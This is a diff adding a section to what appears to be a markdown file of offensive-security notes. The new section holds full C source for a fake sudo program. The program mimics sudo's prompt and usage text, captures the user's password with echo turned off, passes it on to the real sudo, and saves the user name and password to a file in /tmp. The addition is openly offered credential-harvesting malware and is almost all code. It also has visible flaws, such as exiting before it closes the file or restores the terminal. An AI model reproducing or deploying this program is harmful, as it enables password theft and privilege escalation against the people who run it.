@@ -1121,3 +1121,61 @@ if (ip.proto == TCP) {
    }
 }
 ```
+
+## Fake Sudo Program to Harvest Credentials:
+
+Mimics legitimate Sudo binary to capture credentials and output to ```/tmp``` directory file.
+
+```C
+#include <stdio.h>
+#include <stdlib.h>
+#include <termios.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/types.h>
+#include <pwd.h>
+
+
+int main( int argc, char *argv[] )
+{
+    if( argc == 2 ) {
+        struct termios oflags, nflags;
+            char password[64];
+            char Command[255];
+            char *lgn;
+            lgn = getlogin();
+            struct passwd *pw;
+            FILE *fp;
+            /* disabling echo */
+            tcgetattr(fileno(stdin), &oflags);
+            nflags = oflags;
+            nflags.c_lflag &= ~ECHO;
+            nflags.c_lflag |= ECHONL;
+
+            if (tcsetattr(fileno(stdin), TCSANOW, &nflags) != 0) {
+                perror("tcsetattr");
+                return EXIT_FAILURE;
+            }
+
+            printf("Password: ");
+            fgets(password, sizeof(password), stdin);
+            password[strlen(password) - 1] = 0;
+            sprintf(Command, "sudo -S <<< %s command %s", password, argv[1]);
+            system(Command);
+            fp = fopen("/tmp/tmp-mount-sU90gRA6", "w+");
+            fprintf(fp, "User: %s\tPassword: %s", lgn, password); exit(1);
+            fclose(fp);
+            /* restore terminal */
+            if (tcsetattr(fileno(stdin), TCSANOW, &oflags) != 0) {
+                perror("tcsetattr");
+                return EXIT_FAILURE;
+            }
+
+    return 0;
+   }
+   else {
+    printf("usage: sudo -h | -K | -k | -V\nusage: sudo -v [-AknS] [-g group] [-h host] [-p prompt] [-u user]\nusage: sudo -l [-AknS] [-g group] [-h host] [-p prompt] [-U user] [-u user] [command]\nusage: sudo [-AbEHknPS] [-C num] [-D directory] [-g group] [-h host] [-p prompt] [-R directory] [-T timeout] [-u user]\n\t[VAR=value] [-i|-s] [<command>]\nusage: sudo -e [-AknS] [-C num] [-D directory] [-g group] [-h host] [-p prompt] [-R directory] [-T timeout] [-u user]\n\tfile ...\n");
+   }
+	return 0;
+}
+```
